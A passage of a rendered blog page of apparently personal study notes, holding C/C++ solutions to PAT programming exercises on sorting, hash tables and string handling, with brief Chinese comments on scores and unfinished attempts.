class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">//PAT A1055</span></span><br><span class="line"><span class="comment">struct person</span></span><br><span class="line"><span class="comment">&#123;</span></span><br><span class="line"><span class="comment">    char name[10];</span></span><br><span class="line"><span class="comment">    int age;</span></span><br><span class="line"><span class="comment">    int net;</span></span><br><span class="line"><span class="comment">&#125;now[100010];</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">bool net(person a,person b)</span></span><br><span class="line"><span class="comment">&#123;</span></span><br><span class="line"><span class="comment">    if(a.net!=b.net) return a.net&gt;b.net;</span></span><br><span class="line"><span class="comment">    else if(a.age!=b.age) return a.age&lt;b.age;</span></span><br><span class="line"><span class="comment">    return strcmp(a.name,b.name)&lt;0;</span></span><br><span class="line"><span class="comment">&#125;</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">int main()</span></span><br><span class="line"><span class="comment">&#123;</span></span><br><span class="line"><span class="comment">    int N,K;</span></span><br><span class="line"><span class="comment">    scanf(&quot;%d%d&quot;,&amp;N,&amp;K);</span></span><br><span class="line"><span class="comment">    for(int i=0;i&lt;N;i++)&#123;</span></span><br><span class="line"><span class="comment">        scanf(&quot;%s%d%d&quot;,now[i].name,&amp;now[i].age,&amp;now[i].net);</span></span><br><span class="line"><span class="comment">    &#125;</span></span><br><span class="line"><span class="comment">    sort(now,now+N,net);</span></span><br><span class="line"><span class="comment">    int MAX=0;</span></span><br><span class="line"><span class="comment">    int MIN=0;</span></span><br><span class="line"><span class="comment">    int A=0;</span></span><br><span class="line"><span class="comment">    for(int i=0;i&lt;K;i++)&#123;</span></span><br><span class="line"><span class="comment">        int count=0;</span></span><br><span class="line"><span class="comment">        printf(&quot;Case #%d:\n&quot;,i+1);</span></span><br><span class="line"><span class="comment">        scanf(&quot;%d%d%d&quot;,&amp;A,&amp;MIN,&amp;MAX);</span></span><br><span class="line"><span class="comment">        for(int j=0;j&lt;N&amp;&amp;count&lt;A;j++)&#123;</span></span><br><span class="line"><span class="comment">            if(now[j].age&gt;=MIN&amp;&amp;now[j].age&lt;=MAX)&#123;</span></span><br><span class="line"><span class="comment">                printf(&quot;%s %d %d\n&quot;,now[j].name,now[j].age,now[j].net);</span></span><br><span class="line"><span class="comment">                count++;</span></span><br><span class="line"><span class="comment">            &#125;</span></span><br><span class="line"><span class="comment">        &#125;</span></span><br><span class="line"><span class="comment">        if(count==0) printf(&quot;None\n&quot;);</span></span><br><span class="line"><span class="comment">    &#125;</span></span><br><span class="line"><span class="comment">    return 0;</span></span><br><span class="line"><span class="comment">&#125;</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">//PAT A1028</span></span><br><span class="line"><span class="comment">struct student</span></span><br><span class="line"><span class="comment">&#123;</span></span><br><span class="line"><span class="comment">    int ID;</span></span><br><span class="line"><span class="comment">    char name[10];</span></span><br><span class="line"><span class="comment">    int grade;</span></span><br><span class="line"><span class="comment">&#125;now[100010];</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">//ID</span></span><br><span class="line"><span class="comment">bool cmp1(student a,student b)</span></span><br><span class="line"><span class="comment">&#123;</span></span><br><span class="line"><span class="comment">   return a.ID&lt;b.ID;</span></span><br><span class="line"><span class="comment">&#125;</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">//name</span></span><br><span class="line"><span class="comment">bool cmp2(student a,student b)</span></span><br><span class="line"><span class="comment">&#123;</span></span><br><span class="line"><span class="comment">    int s=strcmp(a.name,b.name);</span></span><br><span class="line"><span class="comment">    if(s!=0) return s&lt;0;</span></span><br><span class="line"><span class="comment">    else return a.ID&lt;b.ID;</span></span><br><span class="line"><span class="comment">&#125;</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">//grade</span></span><br><span class="line"><span class="comment">bool cmp3(student a,student b)</span></span><br><span class="line"><span class="comment">&#123;</span></span><br><span class="line"><span class="comment">    if(a.grade!=b.grade) return a.grade&lt;b.grade;</span></span><br><span class="line"><span class="comment">    else return a.ID&lt;b.ID;</span></span><br><span class="line"><span class="comment">&#125;</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">int main()</span></span><br><span class="line"><span class="comment">&#123;</span></span><br><span class="line"><span class="comment">    int N,C;</span></span><br><span class="line"><span class="comment">    scanf(&quot;%d%d&quot;,&amp;N,&amp;C);</span></span><br><span class="line"><span class="comment">    for(int i=0;i&lt;N;i++)&#123;</span></span><br><span class="line"><span class="comment">        scanf(&quot;%d %s %d&quot;,&amp;now[i].ID,now[i].name,&amp;now[i].grade);</span></span><br><span class="line"><span class="comment">    &#125;</span></span><br><span class="line"><span class="comment">    if(C==1)&#123;</span></span><br><span class="line"><span class="comment">        sort(now,now+N,cmp1);</span></span><br><span class="line"><span class="comment">    &#125;</span></span><br><span class="line"><span class="comment">    else if(C==2)&#123;</span></span><br><span class="line"><span class="comment">        sort(now,now+N,cmp2);</span></span><br><span class="line"><span class="comment">    &#125;</span></span><br><span class="line"><span class="comment">    else&#123;</span></span><br><span class="line"><span class="comment">        sort(now,now+N,cmp3);</span></span><br><span class="line"><span class="comment">    &#125;</span></span><br><span class="line"><span class="comment">    for(int i=0;i&lt;N;i++)&#123;</span></span><br><span class="line"><span class="comment">        printf(&quot;%06d %s %d\n&quot;,now[i].ID,now[i].name,now[i].grade);</span></span><br><span class="line"><span class="comment">    &#125;</span></span><br><span class="line"><span class="comment">    return 0;</span></span><br><span class="line"><span class="comment">&#125;</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<hr>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;math.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;algorithm&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">//PAT A1080</span></span><br><span class="line"><span class="comment">//改了很久还是26分</span></span><br><span class="line"><span class="keyword">int</span> q[<span class="number">100</span>]=&#123;<span class="number">0</span>&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">person</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="keyword">int</span> GE;</span><br><span class="line">    <span class="keyword">int</span> GF;</span><br><span class="line">    <span class="keyword">int</span> sum;</span><br><span class="line">    <span class="keyword">int</span> rank=<span class="number">-1</span>;</span><br><span class="line">    <span class="keyword">int</span> choice[<span class="number">6</span>];</span><br><span class="line">    <span class="keyword">int</span> id=<span class="number">-1</span>;</span><br><span class="line">&#125;now[<span class="number">40001</span>];</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">school</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="keyword">int</span> admit[<span class="number">40000</span>];</span><br><span class="line">    <span class="keyword">int</span> lastadmit=<span class="number">-1</span>;</span><br><span class="line">    <span class="keyword">int</span> num=<span class="number">0</span>;</span><br><span class="line">&#125;college[<span class="number">100</span>];</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">bool</span> <span class="title">cmp</span><span class="params">(person a,person b)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(a.sum!=b.sum) <span class="keyword">return</span> a.sum&gt;b.sum;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">return</span> a.GE&gt;b.GE;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">bool</span> <span class="title">cmp2</span><span class="params">(<span class="keyword">int</span> a,<span class="keyword">int</span> b)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> now[a].id&lt;now[b].id;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">int</span> N,M,K;</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%d%d%d&quot;</span>,&amp;N,&amp;M,&amp;K);</span><br><span class="line">    <span class="comment">//init person</span></span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;N;i++)&#123;</span><br><span class="line">        <span class="built_in">memset</span>(now[i].choice,<span class="number">-1</span>,<span class="keyword">sizeof</span>(now[i].choice));</span><br><span class="line">        now[i].id=i;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//init college</span></span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;M;i++)&#123;</span><br><span class="line">        <span class="built_in">memset</span>(college[i].admit,<span class="number">-1</span>,<span class="keyword">sizeof</span>(college[i].admit));</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;M;i++)</span><br><span class="line">        <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>,&amp;q[i]);</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;N;i++)&#123;</span><br><span class="line">        <span class="built_in">scanf</span>(<span class="string">&quot;%d%d&quot;</span>,&amp;now[i].GE,&amp;now[i].GF);</span><br><span class="line">        now[i].sum=now[i].GE+now[i].GF;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> j=<span class="number">0</span>;j&lt;K;j++)&#123;</span><br><span class="line">            <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>,&amp;now[i].choice[j]);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    sort(now,now+N,cmp);</span><br><span class="line">    now[<span class="number">0</span>].rank=<span class="number">1</span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span>;i&lt;N;i++)&#123;</span><br><span class="line">        <span class="keyword">if</span>(now[i].GE==now[i<span class="number">-1</span>].GE&amp;&amp;now[i].sum==now[i<span class="number">-1</span>].sum)</span><br><span class="line">            now[i].rank=now[i<span class="number">-1</span>].rank;</span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">            now[i].rank=i+<span class="number">1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//find suitable</span></span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;N;i++)&#123;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> j=<span class="number">0</span>;j&lt;K;j++)&#123;</span><br><span class="line">            <span class="keyword">if</span>(q[now[i].choice[j]]&gt;<span class="number">0</span>)&#123;</span><br><span class="line">                q[now[i].choice[j]]--;</span><br><span class="line">                college[now[i].choice[j]].admit[now[i].id]=<span class="number">1</span>;</span><br><span class="line">                college[now[i].choice[j]].lastadmit=now[i].id;</span><br><span class="line">                college[now[i].choice[j]].num++;</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span>&#123;</span><br><span class="line">                <span class="keyword">if</span>(now[college[now[i].choice[j]].lastadmit].rank==now[i].rank)&#123;</span><br><span class="line">                    college[now[i].choice[j]].admit[now[i].id]=<span class="number">1</span>;</span><br><span class="line">                    college[now[i].choice[j]].lastadmit=now[i].id;</span><br><span class="line">                    college[now[i].choice[j]].num++;</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;M;i++)&#123;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> j=<span class="number">0</span>;j&lt;N;j++)&#123;</span><br><span class="line">            <span class="keyword">if</span>(college[i].admit[j]==<span class="number">1</span>)&#123;</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">&quot;%d&quot;</span>,j);</span><br><span class="line">                college[i].num--;</span><br><span class="line">                <span class="keyword">if</span>(college[i].num&gt;<span class="number">0</span>)</span><br><span class="line">                    <span class="built_in">printf</span>(<span class="string">&quot; &quot;</span>);</span><br><span class="line">                <span class="keyword">else</span>&#123;</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<hr>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;math.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;algorithm&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">//PAT A1095</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">car</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="keyword">char</span> num[<span class="number">8</span>];</span><br><span class="line">    <span class="keyword">int</span> hh;</span><br><span class="line">    <span class="keyword">int</span> mm;</span><br><span class="line">    <span class="keyword">int</span> ss;</span><br><span class="line">    <span class="keyword">int</span> in_off=<span class="number">-1</span>;</span><br><span class="line">&#125;now[<span class="number">10001</span>];</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> N,K;</span><br><span class="line">    <span class="keyword">char</span> status[<span class="number">4</span>];</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%d%d&quot;</span>,&amp;N,&amp;K);</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;N;i++)&#123;</span><br><span class="line">        <span class="built_in">scanf</span>(<span class="string">&quot;%s %d:%d:%d %s&quot;</span>,now[i].num,&amp;now[i].hh,&amp;now[i].mm,&amp;now[i].ss,status);</span><br><span class="line">        <span class="keyword">if</span>(!<span class="built_in">strcmp</span>(status,<span class="string">&quot;in&quot;</span>)) now[i].in_off=<span class="number">0</span>;   <span class="comment">//off</span></span><br><span class="line">        <span class="keyword">else</span> now[i].in_off=<span class="number">1</span>;   <span class="comment">//in</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//Debug 学完了map再来做</span></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h3 id="4-2"><a href="#4-2" class="headerlink" title="4.2"></a>4.2</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;math.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;algorithm&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">//PAT B1038</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> HashTable[<span class="number">101</span>]=&#123;<span class="number">0</span>&#125;;</span><br><span class="line">    <span class="keyword">int</span> N,K,score;</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>,&amp;N);</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;N;i++)&#123;</span><br><span class="line">        <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>,&amp;score);</span><br><span class="line">        HashTable[score]++;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>,&amp;K);</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;K;i++)&#123;</span><br><span class="line">        <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>,&amp;score);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%d&quot;</span>,HashTable[score]);</span><br><span class="line">        <span class="keyword">if</span>(i&lt;K<span class="number">-1</span>)</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot; &quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">//PAT B1033</span></span><br><span class="line"><span class="comment">int main()</span></span><br><span class="line"><span class="comment">&#123;</span></span><br><span class="line"><span class="comment">    bool HashTable[256];</span></span><br><span class="line"><span class="comment">    memset(HashTable,1,sizeof(HashTable));</span></span><br><span class="line"><span class="comment">    char str1[100001];</span></span><br><span class="line"><span class="comment">    char str2[100001];</span></span><br><span class="line"><span class="comment">    fgets(str1,100001,stdin);  //scanf(&quot;%s&quot;,str1);  一定要读取一行，不然是19分</span></span><br><span class="line"><span class="comment">    scanf(&quot;%s&quot;,str2);</span></span><br><span class="line"><span class="comment">    //printf(&quot;%s\n%s&quot;,str1,str2);</span></span><br><span class="line"><span class="comment">    int len1=strlen(str1);</span></span><br><span class="line"><span class="comment">    int len2=strlen(str2);</span></span><br><span class="line"><span class="comment">    char c1;</span></span><br><span class="line"><span class="comment">    for(int i=0;i&lt;len1;i++)&#123;</span></span><br><span class="line"><span class="comment">        c1=str1[i];</span></span><br><span class="line"><span class="comment">        //printf(&quot;%c %d\n&quot;,c1,c1);</span></span><br><span class="line"><span class="comment">        if(c1&gt;=&#x27;A&#x27;&amp;&amp;c1&lt;=&#x27;Z&#x27;) c1+=32;</span></span><br><span class="line"><span class="comment">        HashTable[c1]=0;</span></span><br><span class="line"><span class="comment">    &#125;</span></span><br><span class="line"><span class="comment">    char c2;</span></span><br><span class="line"><span class="comment">    for(int i=0;i&lt;len2;i++)&#123;</span></span><br><span class="line"><span class="comment">        c2=str2[i];</span></span><br><span class="line"><span class="comment">        //printf(&quot;%c %d &quot;,c2,c2);</span></span><br><span class="line"><span class="comment">        if(c2&gt;=&#x27;A&#x27;&amp;&amp;c2&lt;=&#x27;Z&#x27;)&#123;</span></span><br><span class="line"><span class="comment">            c2+=32;</span></span><br><span class="line"><span class="comment">            //printf(&quot;%c %d\n&quot;,c2,c2);</span></span><br><span class="line"><span class="comment">            if(HashTable[c2]==1&amp;&amp;HashTable[&#x27;+&#x27;]==1)</span></span><br><span class="line"><span class="comment">                printf(&quot;%c&quot;,c2-32);</span></span><br><span class="line"><span class="comment">        &#125;</span></span><br><span class="line"><span class="comment">        else&#123;</span></span><br><span class="line"><span class="comment">            if(HashTable[c2]==1)</span></span><br><span class="line"><span class="comment">                printf(&quot;%c&quot;,c2);</span></span><br><span class="line"><span class="comment">        &#125;</span></span><br><span class="line"><span class="comment">    &#125;</span></span><br><span class="line"><span class="comment">    printf(&quot;\n&quot;);</span></span><br><span class="line"><span class="comment">    return 0;</span></span><br><span class="line"><span class="comment">&#125;</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">//PAT A1084</span></span><br><span class="line"><span class="comment">int main()</span></span><br><span class="line"><span class="comment">&#123;</span></span><br><span class="line"><span class="comment">    int HashTable[128]=&#123;false&#125;;</span></span><br><span class="line"><span class="comment">    char str1[81];</span></span><br><span class="line"><span class="comment">    char str2[81];</span></span><br><span class="line"><span class="comment">    scanf(&quot;%s&quot;,str1);</span></span><br><span class="line"><span class="comment">    scanf(&quot;%s&quot;,str2);</span></span><br><span class="line"><span class="comment">    int len1=strlen(str1);</span></span><br><span class="line"><span class="comment">    int len2=strlen(str2);</span></span><br><span class="line"><span class="comment">    for(int i=0;i&lt;len1;i++)&#123;</span></span><br><span class="line"><span class="comment">        int j;</span></span><br><span class="line"><span class="comment">        char c1,c2;</span></span><br><span class="line"><span class="comment">        for(j=0;j&lt;len2;j++)&#123;</span></span><br><span class="line"><span class="comment">            c1=str1[i];</span></span><br><span class="line"><span class="comment">            c2=str2[j];</span></span><br><span class="line"><span class="comment">            if(c1&gt;=&#x27;a&#x27;&amp;&amp;c1&lt;=&#x27;z&#x27;) c1-=32;</span></span><br><span class="line"><span class="comment">            if(c2&gt;=&#x27;a&#x27;&amp;&amp;c2&lt;=&#x27;z&#x27;) c2-=32;</span></span><br><span class="line"><span class="comment">            if(c1==c2) break;</span></span><br><span class="line"><span class="comment">        &#125;</span></span><br><span class="line"><span class="comment">        if(j==len2&amp;&amp;HashTable[c1]==false)&#123;</span></span><br><span class="line"><span class="comment">            printf(&quot;%c&quot;,c1);</span></span><br><span class="line"><span class="comment">            HashTable[c1]=true;</span></span><br><span class="line"><span class="comment">        &#125;</span></span><br><span class="line"><span class="comment">    &#125;</span></span><br><span class="line"><span class="comment">    return 0;</span></span><br><span class="line"><span class="comment">&#125;</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<hr>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;math.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;algorithm&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">//PAT A1041</span></span><br><span class="line"><span class="comment">//算法笔记书上使用hash做的，这里采用sort</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">bet</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="keyword">int</span> idx;</span><br><span class="line">    <span class="keyword">int</span> num;</span><br><span class="line">    <span class="keyword">int</span> seq;</span><br><span class="line">&#125;now[<span class="number">10001</span>];</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">bool</span> <span class="title">cmp</span><span class="params">(bet a,bet b)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> a.seq&lt;b.seq;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;<span class="number">10001</span>;i++)&#123;</span><br><span class="line">        now[i].idx=i;</span><br><span class="line">        now[i].num=<span class="number">0</span>;</span><br><span class="line">        now[i].seq=<span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">int</span> N;</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>,&amp;N);</span><br><span class="line">    <span class="keyword">int</span> temp;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;N;i++)&#123;</span><br><span class="line">        <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>,&amp;temp);</span><br><span class="line">        now[temp].num++;</span><br><span class="line">        <span class="keyword">if</span>(now[temp].seq==<span class="number">0</span>) now[temp].seq=i+<span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//find</span></span><br><span class="line">    sort(now,now+<span class="number">10001</span>,cmp);</span><br><span class="line">    <span class="keyword">int</span> i;</span><br><span class="line">    <span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;<span class="number">10001</span>;i++)&#123;</span><br><span class="line">        <span class="keyword">if</span>(now[i].num==<span class="number">1</span>)&#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;%d&quot;</span>,now[i].idx);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(i==<span class="number">10001</span>)</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;None&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">//PAT B1047</span></span><br><span class="line"><span class="comment">int main()</span></span><br><span class="line"><span class="comment">&#123;</span></span><br><span class="line"><span class="comment">    int N;</span></span><br><span class="line"><span class="comment">    scanf(&quot;%d&quot;,&amp;N);</span></span><br><span class="line"><span class="comment">    int HashTable[1001]=&#123;0&#125;;</span></span><br><span class="line"><span class="comment">    int t_num,p_num,score;</span></span><br><span class="line"><span class="comment">    while(N--)&#123;</span></span><br><span class="line"><span class="comment">        scanf(&quot;%d-%d %d&quot;,&amp;t_num,&amp;p_num,&amp;score);</span></span><br><span class="line"><span class="comment">        HashTable[t_num]+=score;</span></span><br><span class="line"><span class="comment">    &#125;</span></span><br><span class="line"><span class="comment">    int max=HashTable[1];</span></span><br><span class="line"><span class="comment">    int idx=1;</span></span><br><span class="line"><span class="comment">    for(int i=2;i&lt;1001;i++)&#123;</span></span><br><span class="line"><span class="comment">        if(max&lt;HashTable[i])&#123;</span></span><br><span class="line"><span class="comment">            idx=i;</span></span><br><span class="line"><span class="comment">            max=HashTable[i];</span></span><br><span class="line"><span class="comment">        &#125;</span></span><br><span class="line"><span class="comment">    &#125;</span></span><br><span class="line"><span class="comment">    printf(&quot;%d %d&quot;,idx,max);</span></span><br><span class="line"><span class="comment">    return 0;</span></span><br><span class="line"><span class="comment">&#125;</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">//PAT B1043</span></span><br><span class="line"><span class="comment">char change[6]=&#123;&#x27;P&#x27;,&#x27;A&#x27;,&#x27;T&#x27;,&#x27;e&#x27;,&#x27;s&#x27;,&#x27;t&#x27;&#125;;</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">int main()</span></span><br><span class="line"><span class="comment">&#123;</span></span><br><span class="line"><span class="comment">    int HashTable[6]=&#123;0&#125;;  //PATest</span></span><br><span class="line"><span class="comment">    char str[10001];</span></span><br><span class="line"><span class="comment">    scanf(&quot;%s&quot;,str);</span></span><br><span class="line"><span class="comment">    int len=strlen(str);</span></span><br><span class="line"><span class="comment">    int sum=0;</span></span><br><span class="line"><span class="comment">    for(int i=0;i&lt;len;i++)&#123;</span></span><br><span class="line"><span class="comment">        